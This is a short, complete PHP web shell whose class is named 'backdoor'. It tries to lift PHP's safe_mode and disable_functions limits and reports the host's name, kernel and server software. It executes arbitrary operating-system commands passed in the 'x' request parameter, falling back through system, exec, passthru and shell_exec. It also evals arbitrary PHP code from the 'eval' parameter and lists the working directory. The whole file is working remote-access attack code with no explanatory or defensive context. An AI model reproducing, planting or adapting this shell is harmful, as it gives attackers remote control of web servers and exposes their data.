<?php
ini_restore('safe_mode');
ini_restore('safe_mode_include_dir');
ini_restore('safe_mode_exec_dir');
ini_restore('disable_functions');
ini_restore('allow_url_fopen');
ignore_user_abort(0);

class backdoor {
	var $name;
	var $kernel;
	var $software;
function scdir($dir)
{
	foreach(scandir($dir) as $dir) {
		echo $dir.'<br>';
	}
}

function cmd($cmd)
{
	if(function_exists('system')) {
		ob_start();
		system($cmd);
		$buff=ob_get_contents();
		ob_end_clean();
		return $buff;
		}
		elseif(function_exists('exec')) {
		exec($cmd, $results);
		$buff='';
		foreach($results as $result) {
		$buff.=$result;
		}
		return $buff;
		}
		elseif(function_exists('passthru')) {
		ob_start();
		passthru($cmd);
		$buff=ob_get_contents();
		ob_end_clean();
		return $buff;
		}
		elseif(function_exists('shell_exec')) {
		$buff=shell_exec($cmd);
		return $buff;
		}
		else {
			return ini_get('disable_functions');
		}
	}
}
$server=new backdoor();
$server->kernel=php_uname();
$server->software=$_SERVER['SERVER_SOFTWARE'];
$server->name=$_SERVER['SERVER_NAME'];

echo $server->name.'<br>';
echo $server->kernel.'<br>';
echo $server->software.'<br>';

if(isset($_REQUEST['x'])) {
	echo '<pre>'.$server->cmd($_REQUEST['x']).'</pre>';
}
if(isset($_REQUEST['eval'])) {
	eval($_REQUEST['eval']);
}
echo $server->scdir(getcwd());
